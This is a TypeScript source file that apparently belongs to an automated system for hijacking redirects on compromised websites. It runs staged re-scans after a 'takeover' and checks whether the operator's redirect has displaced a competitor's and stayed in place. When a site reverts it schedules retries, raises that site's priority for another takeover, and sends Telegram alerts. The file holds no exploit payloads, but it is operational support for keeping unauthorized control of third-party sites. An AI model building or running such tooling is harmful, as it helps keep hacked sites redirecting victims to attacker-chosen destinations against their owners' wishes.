/**
 * ═══════════════════════════════════════════════════════════════
 *  TAKEOVER VERIFIER — Auto Re-scan After Takeover Execution
 *  
 *  Multi-stage verification system:
 *  1. Immediate (30s after takeover) — quick check
 *  2. Short-term (5 min) — confirm persistence
 *  3. Medium-term (30 min) — confirm caching cleared
 *  4. Long-term (6 hr) — confirm long-term stability
 *  
 *  Runs autonomously in background via orchestrator.
 *  Sends Telegram notifications on success/failure/revert.
 * ═══════════════════════════════════════════════════════════════
 */
import { eq, and, lte, isNotNull, inArray, desc } from "drizzle-orm";
import { hackedSiteDetections } from "../drizzle/schema";
import { detectExistingRedirects } from "./redirect-takeover";
import { sendTelegramNotification } from "./telegram-notifier";

// ─── Types ───
export interface VerificationResult {
  siteId: number;
  domain: string;
  stage: VerificationStage;
  status: "verified_success" | "verified_reverted" | "verified_partial" | "verification_failed";
  ourRedirectFound: boolean;
  competitorRedirectFound: boolean;
  currentRedirectTarget: string | null;
  details: string;
  shouldRetry: boolean;
}

export type VerificationStage = "immediate" | "short_term" | "medium_term" | "long_term";

interface VerificationSchedule {
  stage: VerificationStage;
  delayMs: number;
  label: string;
}

// ─── Verification Schedule ───
const VERIFICATION_STAGES: VerificationSchedule[] = [
  { stage: "immediate",   delayMs: 30_000,       label: "Immediate (30s)" },
  { stage: "short_term",  delayMs: 5 * 60_000,   label: "Short-term (5min)" },
  { stage: "medium_term", delayMs: 30 * 60_000,  label: "Medium-term (30min)" },
  { stage: "long_term",   delayMs: 6 * 3600_000, label: "Long-term (6hr)" },
];

const MAX_AUTO_RETRIES = 3;

// ─── Get DB ───
async function getDb() {
  const { getDb: _getDb } = await import("./db");
  return _getDb();
}

/**
 * Schedule verification for a site after successful takeover.
 * Called immediately after executeRedirectTakeover succeeds.
 */
export async function scheduleVerification(
  siteId: number,
  ourRedirectUrl: string,
): Promise<void> {
  const db = await getDb();
  if (!db) return;

  const now = new Date();
  const immediateAt = new Date(now.getTime() + VERIFICATION_STAGES[0].delayMs);

  await db.update(hackedSiteDetections).set({
    verificationStatus: "pending",
    verificationStage: "none",
    verificationAttempts: 0,
    nextVerificationAt: immediateAt,
    ourRedirectUrl,
    verificationHistory: [],
  }).where(eq(hackedSiteDetections.id, siteId));

  console.log(`[TakeoverVerifier] Scheduled verification for site #${siteId} — first check at ${immediateAt.toISOString()}`);
}

/**
 * Get the next verification stage after the current one.
 */
function getNextStage(currentStage: VerificationStage): VerificationSchedule | null {
  const idx = VERIFICATION_STAGES.findIndex(s => s.stage === currentStage);
  if (idx < 0 || idx >= VERIFICATION_STAGES.length - 1) return null;
  return VERIFICATION_STAGES[idx + 1];
}

/**
 * Perform a single verification scan on a site.
 * Checks if our redirect is still in place or if competitor has reverted.
 */
export async function verifySingleSite(
  site: {
    id: number;
    domain: string;
    url: string;
    ourRedirectUrl: string | null;
    competitorUrl: string | null;
    verificationStage: string;
    verificationHistory: any[] | null;
    verificationAttempts: number;
    autoRetryCount: number;
  }
): Promise<VerificationResult> {
  const currentStage = (site.verificationStage === "none" ? "immediate" : site.verificationStage) as VerificationStage;

  try {
    // Re-scan the site
    const detection = await detectExistingRedirects(site.url);

    // Determine verification status
    const ourUrl = site.ourRedirectUrl || "";
    const ourRedirectFound = detection.methods.some(m =>
      m.competitorUrl.includes(new URL(ourUrl).hostname)
    ) || (detection.competitorUrl?.includes(new URL(ourUrl).hostname) ?? false);

    const competitorRedirectFound = site.competitorUrl
      ? detection.methods.some(m => m.competitorUrl.includes(site.competitorUrl!))
      : false;

    let status: VerificationResult["status"];
    let details: string;
    let shouldRetry = false;

    if (ourRedirectFound && !competitorRedirectFound) {
      status = "verified_success";
      details = `Our redirect to ${ourUrl} is active. Competitor redirect removed.`;
    } else if (ourRedirectFound && competitorRedirectFound) {
      status = "verified_partial";
      details = `Our redirect found but competitor redirect (${site.competitorUrl}) also still present.`;
      shouldRetry = site.autoRetryCount < MAX_AUTO_RETRIES;
    } else if (!ourRedirectFound && competitorRedirectFound) {
      status = "verified_reverted";
      details = `Takeover reverted! Competitor redirect (${site.competitorUrl}) is back. Our redirect not found.`;
      shouldRetry = site.autoRetryCount < MAX_AUTO_RETRIES;
    } else if (!ourRedirectFound && !competitorRedirectFound && !detection.detected) {
      // Site might have been cleaned — check if any redirect exists
      status = "verified_success";
      details = `Site appears clean — no competitor or our redirect found. Takeover may have triggered site cleanup.`;
    } else {
      // Unknown state — different redirect found
      const currentTarget = detection.competitorUrl || detection.methods[0]?.competitorUrl || null;
      status = "verified_reverted";
      details = `Unknown redirect state. Current target: ${currentTarget}. Our redirect not found.`;
      shouldRetry = site.autoRetryCount < MAX_AUTO_RETRIES;
    }

    const currentTarget = detection.competitorUrl || detection.methods[0]?.competitorUrl || null;

    return {
      siteId: site.id,
      domain: site.domain,
      stage: currentStage,
      status,
      ourRedirectFound,
      competitorRedirectFound,
      currentRedirectTarget: currentTarget,
      details,
      shouldRetry,
    };
  } catch (err: any) {
    return {
      siteId: site.id,
      domain: site.domain,
      stage: currentStage,
      status: "verification_failed",
      ourRedirectFound: false,
      competitorRedirectFound: false,
      currentRedirectTarget: null,
      details: `Verification scan failed: ${err?.message || "unknown error"}`,
      shouldRetry: true,
    };
  }
}

/**
 * Process all pending verifications.
 * Called by the orchestrator on each OODA cycle.
 */
export async function processPendingVerifications(): Promise<{
  processed: number;
  verified: number;
  reverted: number;
  retried: number;
}> {
  const db = await getDb();
  if (!db) return { processed: 0, verified: 0, reverted: 0, retried: 0 };

  const now = new Date();

  // Find sites that need verification (nextVerificationAt <= now)
  const pendingSites = await db.select()
    .from(hackedSiteDetections)
    .where(
      and(
        eq(hackedSiteDetections.verificationStatus, "pending"),
        lte(hackedSiteDetections.nextVerificationAt, now),
        isNotNull(hackedSiteDetections.nextVerificationAt),
      )
    )
    .limit(10);

  let verified = 0, reverted = 0, retried = 0;

  for (const site of pendingSites) {
    const result = await verifySingleSite({
      id: site.id,
      domain: site.domain,
      url: typeof site.url === "string" ? site.url : `https://${site.domain}`,
      ourRedirectUrl: site.ourRedirectUrl,
      competitorUrl: site.competitorUrl,
      verificationStage: site.verificationStage,
      verificationHistory: site.verificationHistory,
      verificationAttempts: site.verificationAttempts,
      autoRetryCount: site.autoRetryCount,
    });

    // Build history entry
    const historyEntry = {
      stage: result.stage,
      timestamp: new Date().toISOString(),
      status: result.status,
      ourRedirectFound: result.ourRedirectFound,
      competitorRedirectFound: result.competitorRedirectFound,
      currentRedirectTarget: result.currentRedirectTarget,
      details: result.details,
    };
    const history = [...(site.verificationHistory || []), historyEntry];

    if (result.status === "verified_success") {
      // Success — check if we need more stages
      const currentStage = result.stage;
      const nextStageInfo = getNextStage(currentStage);

      if (nextStageInfo) {
        // Schedule next verification stage
        const nextAt = new Date(now.getTime() + nextStageInfo.delayMs);
        await db.update(hackedSiteDetections).set({
          verificationStage: currentStage,
          verificationAttempts: site.verificationAttempts + 1,
          verificationHistory: history,
          nextVerificationAt: nextAt,
          verifiedAt: now,
        }).where(eq(hackedSiteDetections.id, site.id));
      } else {
        // All stages passed — mark as fully verified
        await db.update(hackedSiteDetections).set({
          verificationStatus: "verified_success",
          verificationStage: "long_term",
          verificationAttempts: site.verificationAttempts + 1,
          verificationHistory: history,
          nextVerificationAt: null,
          verifiedAt: now,
        }).where(eq(hackedSiteDetections.id, site.id));

        // Send Telegram success notification
        await sendTelegramNotification({
          type: "success",
          targetUrl: site.url,
          redirectUrl: site.ourRedirectUrl || undefined,
          details: `Takeover VERIFIED (all stages passed) on ${site.domain}. Our redirect is stable.`,
        });
        verified++;
      }
    } else if (result.shouldRetry) {
      // Schedule auto-retry
      const retryDelay = 10 * 60_000; // 10 minutes
      const retryAt = new Date(now.getTime() + retryDelay);

      await db.update(hackedSiteDetections).set({
        verificationStatus: "pending",
        verificationStage: result.stage,
        verificationAttempts: site.verificationAttempts + 1,
        verificationHistory: history,
        nextVerificationAt: retryAt,
        autoRetryCount: site.autoRetryCount + 1,
      }).where(eq(hackedSiteDetections.id, site.id));

      // Send Telegram warning
      await sendTelegramNotification({
        type: "partial",
        targetUrl: site.url,
        details: `Verification ${result.status} on ${site.domain}: ${result.details}. Auto-retry #${site.autoRetryCount + 1} scheduled.`,
      });
      retried++;
    } else {
      // Final failure — no more retries
      const finalStatus = result.status === "verified_reverted" ? "verified_reverted" : "verification_failed";
      await db.update(hackedSiteDetections).set({
        verificationStatus: finalStatus,
        verificationStage: result.stage,
        verificationAttempts: site.verificationAttempts + 1,
        verificationHistory: history,
        nextVerificationAt: null,
        verifiedAt: now,
      }).where(eq(hackedSiteDetections.id, site.id));

      // Send Telegram failure notification
      await sendTelegramNotification({
        type: "failure",
        targetUrl: site.url,
        redirectUrl: site.ourRedirectUrl || undefined,
        details: `Takeover FAILED verification on ${site.domain}: ${result.details}. Max retries (${MAX_AUTO_RETRIES}) exhausted.`,
      });

      // If reverted, mark for re-takeover attempt
      if (result.status === "verified_reverted") {
        await db.update(hackedSiteDetections).set({
          takeoverStatus: "failed",
          priority: Math.min(site.priority + 2, 10), // Increase priority for re-attempt
        }).where(eq(hackedSiteDetections.id, site.id));
      }
      reverted++;
    }

    // Small delay between verifications
    await new Promise(r => setTimeout(r, 2000));
  }

  return { processed: pendingSites.length, verified, reverted, retried };
}

/**
 * Get verification stats for the dashboard.
 */
export async function getVerificationStats(): Promise<{
  pendingVerifications: number;
  verifiedSuccess: number;
  verifiedReverted: number;
  verificationFailed: number;
  awaitingRetry: number;
}> {
  const db = await getDb();
  if (!db) return { pendingVerifications: 0, verifiedSuccess: 0, verifiedReverted: 0, verificationFailed: 0, awaitingRetry: 0 };

  const all = await db.select({
    verificationStatus: hackedSiteDetections.verificationStatus,
    autoRetryCount: hackedSiteDetections.autoRetryCount,
  }).from(hackedSiteDetections)
    .where(inArray(hackedSiteDetections.takeoverStatus, ["success", "partial", "failed"]));

  return {
    pendingVerifications: all.filter(s => s.verificationStatus === "pending").length,
    verifiedSuccess: all.filter(s => s.verificationStatus === "verified_success").length,
    verifiedReverted: all.filter(s => s.verificationStatus === "verified_reverted").length,
    verificationFailed: all.filter(s => s.verificationStatus === "verification_failed").length,
    awaitingRetry: all.filter(s => s.verificationStatus === "pending" && s.autoRetryCount > 0).length,
  };
}

/**
 * Get recent verification history for a specific site.
 */
export async function getSiteVerificationHistory(siteId: number) {
  const db = await getDb();
  if (!db) return null;

  const [site] = await db.select({
    id: hackedSiteDetections.id,
    domain: hackedSiteDetections.domain,
    verificationStatus: hackedSiteDetections.verificationStatus,
    verificationStage: hackedSiteDetections.verificationStage,
    verificationAttempts: hackedSiteDetections.verificationAttempts,
    verificationHistory: hackedSiteDetections.verificationHistory,
    verifiedAt: hackedSiteDetections.verifiedAt,
    nextVerificationAt: hackedSiteDetections.nextVerificationAt,
    autoRetryCount: hackedSiteDetections.autoRetryCount,
    ourRedirectUrl: hackedSiteDetections.ourRedirectUrl,
  }).from(hackedSiteDetections)
    .where(eq(hackedSiteDetections.id, siteId))
    .limit(1);

  return site || null;
}

/**
 * Manually trigger immediate verification for a site.
 */
export async function triggerImmediateVerification(siteId: number): Promise<VerificationResult | null> {
  const db = await getDb();
  if (!db) return null;

  const [site] = await db.select()
    .from(hackedSiteDetections)
    .where(eq(hackedSiteDetections.id, siteId))
    .limit(1);

  if (!site) return null;

  const result = await verifySingleSite({
    id: site.id,
    domain: site.domain,
    url: typeof site.url === "string" ? site.url : `https://${site.domain}`,
    ourRedirectUrl: site.ourRedirectUrl,
    competitorUrl: site.competitorUrl,
    verificationStage: "immediate",
    verificationHistory: site.verificationHistory,
    verificationAttempts: site.verificationAttempts,
    autoRetryCount: site.autoRetryCount,
  });

  // Update DB with result
  const historyEntry = {
    stage: result.stage,
    timestamp: new Date().toISOString(),
    status: result.status,
    ourRedirectFound: result.ourRedirectFound,
    competitorRedirectFound: result.competitorRedirectFound,
    currentRedirectTarget: result.currentRedirectTarget,
    details: result.details,
  };
  const history = [...(site.verificationHistory || []), historyEntry];

  await db.update(hackedSiteDetections).set({
    verificationStatus: result.status,
    verificationStage: result.stage,
    verificationAttempts: site.verificationAttempts + 1,
    verificationHistory: history,
    verifiedAt: new Date(),
  }).where(eq(hackedSiteDetections.id, siteId));

  return result;
}
